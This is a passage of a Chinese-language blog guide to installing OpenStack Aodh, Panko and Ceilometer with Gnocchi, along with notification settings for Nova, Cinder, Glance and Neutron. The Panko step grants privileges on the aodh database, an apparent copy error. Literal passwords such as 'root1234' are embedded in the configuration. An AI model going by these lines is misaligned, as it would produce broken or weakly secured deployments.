aodh.aodh <span class="regexp">/var/</span>www<span class="regexp">/cgi-bin/</span>aodh</span><br></pre></td></tr></table></figure><h3 id="完成安装"><a href="#完成安装" class="headerlink" title="完成安装"></a>完成安装</h3><h4 id="1-初始化数据库-仅当使用-SQL-数据库的时候才需要初始化"><a href="#1-初始化数据库-仅当使用-SQL-数据库的时候才需要初始化" class="headerlink" title="1. 初始化数据库(仅当使用 SQL 数据库的时候才需要初始化)"></a>1. 初始化数据库(仅当使用 SQL 数据库的时候才需要初始化)</h4><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># aodh-dbsync</span></span><br></pre></td></tr></table></figure><h4 id="2-重启-httpd-以加载-aodh"><a href="#2-重启-httpd-以加载-aodh" class="headerlink" title="2. 重启 httpd 以加载 aodh"></a>2. 重启 httpd 以加载 aodh</h4><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># systemctl restart httpd</span></span><br></pre></td></tr></table></figure><h4 id="3-启动服务并设置开机自启-任一控制节点执行"><a href="#3-启动服务并设置开机自启-任一控制节点执行" class="headerlink" title="3. 启动服务并设置开机自启(任一控制节点执行)"></a>3. 启动服务并设置开机自启(任一控制节点执行)</h4><figure class="highlight thrift"><table><tr><td class="code"><pre><span class="line"># systemctl enable openstack-aodh-evaluator.<span class="keyword">service</span> openstack-aodh-notifier.<span class="keyword">service</span> openstack-aodh-listener.<span class="keyword">service</span></span><br><span class="line"># systemctl start openstack-aodh-evaluator.<span class="keyword">service</span> openstack-aodh-notifier.<span class="keyword">service</span> openstack-aodh-listener.<span class="keyword">service</span></span><br></pre></td></tr></table></figure><h2 id="Panko-服务-ceilometer节点"><a href="#Panko-服务-ceilometer节点" class="headerlink" title="Panko 服务 (ceilometer节点)"></a>Panko 服务 (ceilometer节点)</h2><h3 id="先决条件-2"><a href="#先决条件-2" class="headerlink" title="先决条件"></a>先决条件</h3><h4 id="1-完成以下步骤，创建数据库-2"><a href="#1-完成以下步骤，创建数据库-2" class="headerlink" title="1. 完成以下步骤，创建数据库"></a>1. 完成以下步骤，创建数据库</h4><ul><li>使用 root 用户登录数据库<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>mysql -u root -p</span><br></pre></td></tr></table></figure></li><li>创建 panko 数据库<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> panko;</span><br></pre></td></tr></table></figure></li><li>配置 panko 数据库权限（数据库密码为 e0ee97b87b0be41b5ba0 ）<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> aodh.* <span class="keyword">TO</span> <span class="string">&#x27;panko&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;e0ee97b87b0be41b5ba0&#x27;</span>;</span><br><span class="line">&gt; <span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> aodh.* <span class="keyword">TO</span> <span class="string">&#x27;panko&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;e0ee97b87b0be41b5ba0&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li>退出数据库</li></ul><h4 id="2-加载-admin-用户认证文件-2"><a href="#2-加载-admin-用户认证文件-2" class="headerlink" title="2. 加载 admin 用户认证文件"></a>2. 加载 admin 用户认证文件</h4><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>. admin-openrc</span><br></pre></td></tr></table></figure><h4 id="3-完成一下步骤创建服务认证-1"><a href="#3-完成一下步骤创建服务认证-1" class="headerlink" title="3. 完成一下步骤创建服务认证"></a>3. 完成一下步骤创建服务认证</h4><ul><li>创建 panko 用户（用户密码为 PANKO_PASSWORD）<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">$ openstack <span class="keyword">user</span> <span class="title">create</span> --domain default --password-prompt panko</span><br></pre></td></tr></table></figure></li><li>为 panko 用户增加 admin 的角色<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">$ openstack <span class="keyword">role</span> <span class="title">add</span> --project service --<span class="keyword">user</span> <span class="title">panko</span> admin</span><br></pre></td></tr></table></figure></li><li>创建 panko 服务实体<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line">$ <span class="string">openstack</span> <span class="string">service</span> <span class="string">create</span> <span class="built_in">--name</span> <span class="string">panko</span> <span class="built_in">--description</span> <span class="string">&quot;OpenStack Event Service&quot;</span> <span class="string">event</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="4-创建Event服务API-endpoints"><a href="#4-创建Event服务API-endpoints" class="headerlink" title="4. 创建Event服务API endpoints"></a>4. 创建Event服务API endpoints</h4><figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">$ openstack endpoint <span class="keyword">create</span> --region RegionOne <span class="keyword">event</span> <span class="keyword">public</span> http:<span class="comment">//controller:8779</span></span><br><span class="line">$ openstack endpoint <span class="keyword">create</span> --region RegionOne <span class="keyword">event</span> internal http:<span class="comment">//controller:8779</span></span><br><span class="line">$ openstack endpoint <span class="keyword">create</span> --region RegionOne <span class="keyword">event</span> admin http:<span class="comment">//controller:8779</span></span><br></pre></td></tr></table></figure><h3 id="安装和配置组件-2"><a href="#安装和配置组件-2" class="headerlink" title="安装和配置组件"></a>安装和配置组件</h3><h4 id="1-安装软件包-2"><a href="#1-安装软件包-2" class="headerlink" title="1. 安装软件包"></a>1. 安装软件包</h4><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># yum install openstack-panko-api openstack-panko-common -y</span></span><br></pre></td></tr></table></figure><h4 id="2-编辑-etc-panko-panko-conf-文件加入以下内容"><a href="#2-编辑-etc-panko-panko-conf-文件加入以下内容" class="headerlink" title="2. 编辑 /etc/panko/panko.conf 文件加入以下内容"></a>2. 编辑 /etc/panko/panko.conf 文件加入以下内容</h4><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/panko/panko.conf</span></span><br><span class="line"></span><br><span class="line"><span class="section">[DEFAULT]</span></span><br><span class="line"><span class="attr">auth_strategy</span> = keystone</span><br><span class="line"><span class="attr">log_file</span> = /var/log/panko/panko.log</span><br><span class="line"><span class="attr">log_dir</span> = /var/log/panko</span><br><span class="line"></span><br><span class="line"><span class="section">[api]</span></span><br><span class="line"><span class="attr">host</span>=<span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">port</span>=<span class="number">8779</span></span><br><span class="line"><span class="attr">workers</span>=<span class="number">2</span></span><br><span class="line"><span class="attr">max_limit</span>=<span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[database]</span></span><br><span class="line"><span class="attr">connection</span> = mysql+pymysql://panko:PANKO_DBPASSWORD@controller/panko</span><br><span class="line"></span><br><span class="line"><span class="section">[keystone_authtoken]</span></span><br><span class="line"><span class="attr">auth_uri</span> = http://controller:<span class="number">5000</span></span><br><span class="line"><span class="attr">auth_url</span> = http://controller:<span class="number">35357</span></span><br><span class="line"><span class="attr">memcached_servers</span> = controller</span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">project_domain_name</span> = default</span><br><span class="line"><span class="attr">user_domain_name</span> = default</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">username</span> = panko</span><br><span class="line"><span class="attr">password</span> = PANKO_PASSWORD</span><br></pre></td></tr></table></figure><h4 id="3-新建-vim-etc-httpd-conf-d-10-panko-wsgi-conf-文件，加入以下内容"><a href="#3-新建-vim-etc-httpd-conf-d-10-panko-wsgi-conf-文件，加入以下内容" class="headerlink" title="3. 新建 vim /etc/httpd/conf.d/10-panko_wsgi.conf 文件，加入以下内容"></a>3. 新建 vim /etc/httpd/conf.d/10-panko_wsgi.conf 文件，加入以下内容</h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute"><span class="nomarkup">Listen</span></span> <span class="number">8779</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:8779</span>&gt;</span></span><br><span class="line">  <span class="attribute"><span class="nomarkup">ServerName</span></span> controller</span><br><span class="line"></span><br><span class="line">  <span class="comment">## Vhost docroot</span></span><br><span class="line">  <span class="attribute"><span class="nomarkup">DocumentRoot</span></span> <span class="string">&quot;/var/www/cgi-bin/panko&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">## Directories, there should at least be a declaration for /var/www/cgi-bin/panko</span></span><br><span class="line"></span><br><span class="line">  <span class="section">&lt;Directory <span class="string">&quot;/var/www/cgi-bin/panko&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">Options</span></span> Indexes FollowSymLinks MultiViews</span><br><span class="line">    <span class="attribute">AllowOverride</span> None</span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line">  <span class="section">&lt;/Directory&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">## Logging</span></span><br><span class="line">  <span class="attribute">ErrorLog</span> <span class="string">&quot;/var/log/httpd/panko_wsgi_error.log&quot;</span></span><br><span class="line">  <span class="attribute">ServerSignature</span> <span class="literal">Off</span> </span><br><span class="line">  <span class="attribute">CustomLog</span> <span class="string">&quot;/var/log/httpd/panko_wsgi_access.log&quot;</span> combined </span><br><span class="line">  <span class="attribute">SetEnvIf</span> X-Forwarded-Proto https HTTPS=<span class="number">1</span></span><br><span class="line">  <span class="attribute">WSGIApplicationGroup</span> <span class="variable">%&#123;GLOBAL&#125;</span></span><br><span class="line">  <span class="attribute">WSGIDaemonProcess</span> panko display-name=panko_wsgi group=panko processes=<span class="number">2</span> threads=<span class="number">2</span> user=panko</span><br><span class="line">  <span class="attribute">WSGIProcessGroup</span> panko</span><br><span class="line">  <span class="attribute">WSGIScriptAlias</span> / <span class="string">&quot;/var/www/cgi-bin/panko/app&quot;</span></span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure><h4 id="4-复制-app-wsgi-2"><a href="#4-复制-app-wsgi-2" class="headerlink" title="4. 复制 app.wsgi"></a>4. 复制 app.wsgi</h4><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># mkdir <span class="regexp">/var/</span>www<span class="regexp">/cgi-bin/</span>panko/</span><br><span class="line"># cp <span class="regexp">/usr/</span>lib<span class="regexp">/python2.7/</span>site-packages<span class="regexp">/panko/</span>api<span class="regexp">/app.wsgi /</span>var<span class="regexp">/www/</span>cgi-bin<span class="regexp">/panko/</span>app</span><br><span class="line"># chown -R panko.panko <span class="regexp">/var/</span>www<span class="regexp">/cgi-bin/</span>panko/</span><br></pre></td></tr></table></figure><h4 id="5-初始化数据"><a href="#5-初始化数据" class="headerlink" title="5. 初始化数据"></a>5. 初始化数据</h4><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># <span class="regexp">/usr/</span>bin/panko-dbsync</span><br></pre></td></tr></table></figure><h3 id="完成安装-1"><a href="#完成安装-1" class="headerlink" title="完成安装"></a>完成安装</h3><p>重启 httpd 以加载 panko</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># systemctl restart httpd</span></span><br></pre></td></tr></table></figure><h2 id="Ceilometer服务"><a href="#Ceilometer服务" class="headerlink" title="Ceilometer服务"></a>Ceilometer服务</h2><h3 id="安装和配置控制节点-ceilometer节点"><a href="#安装和配置控制节点-ceilometer节点" class="headerlink" title="安装和配置控制节点 (ceilometer节点)"></a>安装和配置控制节点 (ceilometer节点)</h3><h4 id="Ceilometer"><a href="#Ceilometer" class="headerlink" title="Ceilometer"></a>Ceilometer</h4><h5 id="先决条件-3"><a href="#先决条件-3" class="headerlink" title="先决条件"></a>先决条件</h5><h6 id="1-加载-admin-认证文件"><a href="#1-加载-admin-认证文件" class="headerlink" title="1. 加载 admin 认证文件"></a>1. 加载 admin 认证文件</h6><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>. admin-openrc</span><br></pre></td></tr></table></figure><h6 id="2-创建服务认证，完成以下步骤"><a href="#2-创建服务认证，完成以下步骤" class="headerlink" title="2. 创建服务认证，完成以下步骤"></a>2. 创建服务认证，完成以下步骤</h6><ul><li>创建ceilemeter用户（用户密码为 CEILOMETER_PASSWORD）<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">$ openstack <span class="keyword">user</span> <span class="title">create</span> --domain default --password-prompt ceilometer</span><br></pre></td></tr></table></figure></li><li>给ceilometer用户增加admin的角色<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">$ openstack <span class="keyword">role</span> <span class="title">add</span> --project service --<span class="keyword">user</span> <span class="title">ceilometer</span> admin</span><br></pre></td></tr></table></figure></li><li>创建ceilometer服务实体<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line">$ <span class="string">openstack</span> <span class="string">service</span> <span class="string">create</span> <span class="built_in">--name</span> <span class="string">ceilometer</span> <span class="built_in">--description</span> <span class="string">&quot;Telemetry&quot;</span> <span class="string">metering</span></span><br></pre></td></tr></table></figure></li><li>创建 Telemetry 服务 API endpoint<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">$ openstack endpoint <span class="keyword">create</span> --region RegionOne metering <span class="keyword">public</span> http:<span class="comment">//controller:8777</span></span><br><span class="line">$ openstack endpoint <span class="keyword">create</span> --region RegionOne metering internal http:<span class="comment">//controller:8777</span></span><br><span class="line">$ openstack endpoint <span class="keyword">create</span> --region RegionOne metering admin http:<span class="comment">//controller:8777</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="安装并配置组件"><a href="#安装并配置组件" class="headerlink" title="安装并配置组件"></a>安装并配置组件</h5><h5 id="1-安装软件包-3"><a href="#1-安装软件包-3" class="headerlink" title="1. 安装软件包"></a>1. 安装软件包</h5><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="comment"># yum install openstack-ceilometer-api \</span></span><br><span class="line">  openstack-ceilometer-collector openstack-ceilometer-notification <span class="string">\</span></span><br><span class="line">  openstack-ceilometer-central python-ceilometerclient  -y</span><br></pre></td></tr></table></figure><h5 id="2-编辑-etc-ceilometer-ceilometer-conf-文件加入以下内容"><a href="#2-编辑-etc-ceilometer-ceilometer-conf-文件加入以下内容" class="headerlink" title="2. 编辑 /etc/ceilometer/ceilometer.conf 文件加入以下内容"></a>2. 编辑 /etc/ceilometer/ceilometer.conf 文件加入以下内容</h5><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/ceilometer/ceilometer.conf</span></span><br><span class="line"><span class="section">[DEFAULT]</span></span><br><span class="line"><span class="attr">transport_url</span> = rabbit://openstack:root1234@controller</span><br><span class="line"><span class="attr">auth_strategy</span> = keystone</span><br><span class="line"><span class="attr">meter_dispatchers</span>=gnocchi</span><br><span class="line"><span class="attr">event_dispatchers</span>=gnocchi</span><br><span class="line"></span><br><span class="line"><span class="section">[dispatcher_gnocchi]</span></span><br><span class="line"><span class="attr">filter_service_activity</span> = <span class="literal">False</span></span><br><span class="line"><span class="attr">archive_policy</span> = high</span><br><span class="line"><span class="attr">resources_definition_file</span>=gnocchi_resources.yaml</span><br><span class="line"><span class="attr">url</span>=http://controller:<span class="number">8041</span></span><br><span class="line"></span><br><span class="line"><span class="section">[keystone_authtoken]</span></span><br><span class="line"><span class="attr">auth_uri</span> = http://controller:<span class="number">5000</span></span><br><span class="line"><span class="attr">auth_url</span> = http://controller:<span class="number">35357</span></span><br><span class="line"><span class="attr">memcached_servers</span> = controller</span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">project_domain_name</span> = default</span><br><span class="line"><span class="attr">user_domain_name</span> = default</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">username</span> = ceilometer</span><br><span class="line"><span class="attr">password</span> = CEILOMETER_PASSWORD</span><br><span class="line"><span class="attr">service_token_roles_required</span> = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="section">[service_credentials]</span></span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">auth_url</span> = http://controller:<span class="number">5000</span>/v3</span><br><span class="line"><span class="attr">project_domain_name</span> = default</span><br><span class="line"><span class="attr">user_domain_name</span> = default</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">username</span> = ceilometer</span><br><span class="line"><span class="attr">password</span> = CEILOMETER_PASSWORD</span><br><span class="line"><span class="attr">interface</span> = internalURL</span><br><span class="line"><span class="attr">region_name</span> = RegionOne</span><br></pre></td></tr></table></figure><h5 id="3-新建-etc-httpd-conf-d-10-ceilometer-wsgi-conf-文件，加入以下内容"><a href="#3-新建-etc-httpd-conf-d-10-ceilometer-wsgi-conf-文件，加入以下内容" class="headerlink" title="3. 新建 /etc/httpd/conf.d/10-ceilometer_wsgi.conf 文件，加入以下内容"></a>3. 新建 /etc/httpd/conf.d/10-ceilometer_wsgi.conf 文件，加入以下内容</h5><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/httpd/conf.d/10-ceilometer_wsgi.conf</span></span><br><span class="line"></span><br><span class="line"><span class="attribute"><span class="nomarkup">Listen</span></span> <span class="number">8777</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:8777</span>&gt;</span></span><br><span class="line">  <span class="attribute"><span class="nomarkup">ServerName</span></span> controller</span><br><span class="line"></span><br><span class="line">  <span class="comment">## Vhost docroot</span></span><br><span class="line">  <span class="attribute"><span class="nomarkup">DocumentRoot</span></span> <span class="string">&quot;/var/www/cgi-bin/ceilometer&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">## Directories, there should at least be a declaration for /var/www/cgi-bin/ceilometer</span></span><br><span class="line"></span><br><span class="line">  <span class="section">&lt;Directory <span class="string">&quot;/var/www/cgi-bin/ceilometer&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">Options</span></span> Indexes FollowSymLinks MultiViews</span><br><span class="line">    <span class="attribute">AllowOverride</span> None</span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line">  <span class="section">&lt;/Directory&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">## Logging</span></span><br><span class="line">  <span class="attribute">ErrorLog</span> <span class="string">&quot;/var/log/httpd/ceilometer_wsgi_error.log&quot;</span></span><br><span class="line">  <span class="attribute">ServerSignature</span> <span class="literal">Off</span> </span><br><span class="line">  <span class="attribute">CustomLog</span> <span class="string">&quot;/var/log/httpd/ceilometer_wsgi_access.log&quot;</span> combined </span><br><span class="line">  <span class="attribute">SetEnvIf</span> X-Forwarded-Proto https HTTPS=<span class="number">1</span></span><br><span class="line">  <span class="attribute">WSGIApplicationGroup</span> <span class="variable">%&#123;GLOBAL&#125;</span></span><br><span class="line">  <span class="attribute">WSGIDaemonProcess</span> ceilometer display-name=ceilometer_wsgi group=ceilometer processes=<span class="number">1</span> threads=<span class="number">2</span> user=ceilometer</span><br><span class="line">  <span class="attribute">WSGIProcessGroup</span> ceilometer</span><br><span class="line">  <span class="attribute">WSGIScriptAlias</span> / <span class="string">&quot;/var/www/cgi-bin/ceilometer/app&quot;</span></span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure><h5 id="4-复制-app-wsgi-3"><a href="#4-复制-app-wsgi-3" class="headerlink" title="4. 复制 app.wsgi"></a>4. 复制 app.wsgi</h5><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># mkdir <span class="regexp">/var/</span>www<span class="regexp">/cgi-bin/</span>ceilometer/</span><br><span class="line"># cp <span class="regexp">/usr/</span>lib<span class="regexp">/python2.7/</span>site-packages<span class="regexp">/ceilometer/</span>api<span class="regexp">/app.wsgi /</span>var<span class="regexp">/www/</span>cgi-bin<span class="regexp">/ceilometer/</span>app</span><br><span class="line"># chown -R ceilometer.ceilometer <span class="regexp">/var/</span>www<span class="regexp">/cgi-bin/</span>ceilometer/</span><br></pre></td></tr></table></figure><ol start="5"><li>运行一下命令在gnocchi中创建ceilometer的资源<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># ceilometer-upgrade --skip-metering-database</span></span><br></pre></td></tr></table></figure></li></ol><h5 id="完成安装-2"><a href="#完成安装-2" class="headerlink" title="完成安装"></a>完成安装</h5><h5 id="1-重启-httpd-以加载-ceilometer"><a href="#1-重启-httpd-以加载-ceilometer" class="headerlink" title="1. 重启 httpd 以加载 ceilometer"></a>1. 重启 httpd 以加载 ceilometer</h5><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># systemctl restart httpd</span></span><br></pre></td></tr></table></figure><h5 id="2-启动服务并设置开机自启"><a href="#2-启动服务并设置开机自启" class="headerlink" title="2. 启动服务并设置开机自启"></a>2. 启动服务并设置开机自启</h5><figure class="highlight thrift"><table><tr><td class="code"><pre><span class="line"># systemctl enable openstack-ceilometer-notification.<span class="keyword">service</span> \</span><br><span class="line">  openstack-ceilometer-central.<span class="keyword">service</span> \</span><br><span class="line">  openstack-ceilometer-collector.<span class="keyword">service</span></span><br><span class="line"># systemctl start openstack-ceilometer-notification.<span class="keyword">service</span> \</span><br><span class="line">  openstack-ceilometer-central.<span class="keyword">service</span> \</span><br><span class="line">  openstack-ceilometer-collector.<span class="keyword">service</span></span><br></pre></td></tr></table></figure><h3 id="安装和配置计算节点-计算节点"><a href="#安装和配置计算节点-计算节点" class="headerlink" title="安装和配置计算节点 (计算节点)"></a>安装和配置计算节点 (计算节点)</h3><h4 id="安装并配置组件-1"><a href="#安装并配置组件-1" class="headerlink" title="安装并配置组件"></a>安装并配置组件</h4><h5 id="1-安装软件包-4"><a href="#1-安装软件包-4" class="headerlink" title="1. 安装软件包"></a>1. 安装软件包</h5><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># yum install openstack-ceilometer-compute python2-wsme</span></span><br></pre></td></tr></table></figure><h5 id="2-编辑-etc-ceilometer-ceilometer-conf-文件加入已下内容"><a href="#2-编辑-etc-ceilometer-ceilometer-conf-文件加入已下内容" class="headerlink" title="2. 编辑 /etc/ceilometer/ceilometer.conf 文件加入已下内容"></a>2. 编辑 /etc/ceilometer/ceilometer.conf 文件加入已下内容</h5><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/ceilometer/ceilometer.conf</span></span><br><span class="line"><span class="section">[DEFAULT]</span></span><br><span class="line"><span class="attr">transport_url</span> = rabbit://openstack:root1234@controller</span><br><span class="line"><span class="attr">auth_strategy</span> = keystone</span><br><span class="line"></span><br><span class="line"><span class="section">[keystone_authtoken]</span></span><br><span class="line"><span class="attr">auth_uri</span> = http://controller:<span class="number">5000</span></span><br><span class="line"><span class="attr">auth_url</span> = http://controller:<span class="number">35357</span></span><br><span class="line"><span class="attr">memcached_servers</span> = controller01:<span class="number">11211</span>,controller02:<span class="number">11211</span>,controller03:<span class="number">11211</span></span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">project_domain_name</span> = default</span><br><span class="line"><span class="attr">user_domain_name</span> = default</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">username</span> = ceilometer</span><br><span class="line"><span class="attr">password</span> = CEILOMETER_PASSWORD</span><br><span class="line"></span><br><span class="line"><span class="section">[service_credentials]</span></span><br><span class="line"><span class="attr">auth_url</span> = http://controller:<span class="number">5000</span></span><br><span class="line"><span class="attr">project_domain_id</span> = default</span><br><span class="line"><span class="attr">user_domain_id</span> = default</span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">username</span> = ceilometer</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">password</span> = CEILOMETER_PASSWORD</span><br><span class="line"><span class="attr">interface</span> = internalURL</span><br><span class="line"><span class="attr">region_name</span> = RegionOne</span><br></pre></td></tr></table></figure><h4 id="配置计算节点使用Telemetry"><a href="#配置计算节点使用Telemetry" class="headerlink" title="配置计算节点使用Telemetry"></a>配置计算节点使用Telemetry</h4><p>编辑 /etc/nova/nova.conf 加入以下内容</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/nova/nova.conf</span></span><br><span class="line"><span class="section">[DEFAULT]</span></span><br><span class="line"><span class="attr">instance_usage_audit</span> = <span class="literal">True</span></span><br><span class="line"><span class="attr">instance_usage_audit_period</span> = hour</span><br><span class="line"><span class="attr">notify_on_state_change</span> = vm_and_task_state</span><br><span class="line"></span><br><span class="line"><span class="section">[oslo_messaging_notifications]</span></span><br><span class="line"><span class="attr">driver</span> = messagingv2</span><br></pre></td></tr></table></figure><h4 id="完成安装-3"><a href="#完成安装-3" class="headerlink" title="完成安装"></a>完成安装</h4><h5 id="1-启动agent并设置开机自启"><a href="#1-启动agent并设置开机自启" class="headerlink" title="1. 启动agent并设置开机自启"></a>1. 启动agent并设置开机自启</h5><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># systemctl enable openstack-ceilometer-compute.service</span></span><br><span class="line"><span class="meta"># systemctl start openstack-ceilometer-compute.service</span></span><br></pre></td></tr></table></figure><h5 id="2-重启计算服务"><a href="#2-重启计算服务" class="headerlink" title="2. 重启计算服务"></a>2. 重启计算服务</h5><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># systemctl restart openstack-nova-compute.service</span></span><br></pre></td></tr></table></figure><h1 id="配置-opesntack-服务以支持ceilometer-控制节点"><a href="#配置-opesntack-服务以支持ceilometer-控制节点" class="headerlink" title="配置 opesntack 服务以支持ceilometer (控制节点)"></a>配置 opesntack 服务以支持ceilometer (控制节点)</h1><h2 id="Cinder"><a href="#Cinder" class="headerlink" title="Cinder"></a>Cinder</h2><h3 id="1-配置cinder使用telemetry"><a href="#1-配置cinder使用telemetry" class="headerlink" title="1. 配置cinder使用telemetry"></a>1. 配置cinder使用telemetry</h3><p>编辑/etc/cinder/cinder.conf文件加入以下内容</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[oslo_messaging_notifications]</span></span><br><span class="line"><span class="attr">driver</span> = messagingv2</span><br></pre></td></tr></table></figure><h3 id="2-通过定时任务获取阶段性的通知，例如没5分钟执行一次"><a href="#2-通过定时任务获取阶段性的通知，例如没5分钟执行一次" class="headerlink" title="2. 通过定时任务获取阶段性的通知，例如没5分钟执行一次"></a>2. 通过定时任务获取阶段性的通知，例如没5分钟执行一次</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># crontab -e</span></span><br><span class="line"></span><br><span class="line">*<span class="regexp">/5 * * * * /u</span>sr<span class="regexp">/bin/</span>cinder-volume-usage-audit --send_actions</span><br></pre></td></tr></table></figure><h3 id="3-重启服务"><a href="#3-重启服务" class="headerlink" title="3. 重启服务"></a>3. 重启服务</h3><figure class="highlight thrift"><table><tr><td class="code"><pre><span class="line"># systemctl restart openstack-cinder-api.<span class="keyword">service</span> openstack-cinder-scheduler.<span class="keyword">service</span> openstack-cinder-volume.<span class="keyword">service</span></span><br></pre></td></tr></table></figure><h2 id="Glance"><a href="#Glance" class="headerlink" title="Glance"></a>Glance</h2><h3 id="1-配置镜像服务使用telemetry"><a href="#1-配置镜像服务使用telemetry" class="headerlink" title="1. 配置镜像服务使用telemetry"></a>1. 配置镜像服务使用telemetry</h3><p>编辑/etc/glance/glance-api.conf 和 /etc/glance/glance-registry.conf</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[DEFAULT]</span></span><br><span class="line"><span class="attr">transport_url</span> = rabbit://openstack:root1234@controller</span><br><span class="line"></span><br><span class="line"><span class="section">[oslo_messaging_notifications]</span></span><br><span class="line"><span class="attr">driver</span> = messagingv2</span><br></pre></td></tr></table></figure><h3 id="2-重启服务"><a href="#2-重启服务" class="headerlink" title="2. 重启服务"></a>2. 重启服务</h3><figure class="highlight thrift"><table><tr><td class="code"><pre><span class="line"># systemctl restart openstack-glance-api.<span class="keyword">service</span> openstack-glance-registry.<span class="keyword">service</span></span><br></pre></td></tr></table></figure><h2 id="Neutron"><a href="#Neutron" class="headerlink" title="Neutron"></a>Neutron</h2><h3 id="1-配置网络服务使用telemetry"><a href="#1-配置网络服务使用telemetry" class="headerlink" title="1. 配置网络服务使用telemetry"></a>1. 配置网络服务使用telemetry</h3><p>编辑 /etc/neutron/neutron.conf 文件加入以下内容</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[oslo_messaging_notifications]</span></span><br><span class="line"><span class="attr">driver</span> = messagingv2</span><br></pre></td></tr></table></figure><h3 id="2-重启服务-1"><a href="#2-重启服务-1" class="headerlink" title="2. 重启服务"></a>2. 重启服务</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"># systemctl <span class="keyword">restart</span> neutron-<span class="keyword">server</span>.service</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openstack </tag>
            
            <tag> ceilometer </tag>
            
            <tag> gnocchi </tag>
            
            <tag> aodh </tag>
            
            <tag> panko </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rabbitmq无法重新加入集群，启动失败的问题</title>
      <link href="openstack/rabbitmq-can-not-join-cluster.html"/>
      <url>openstack/rabbitmq-can-not-join-cluster.html</url>
      
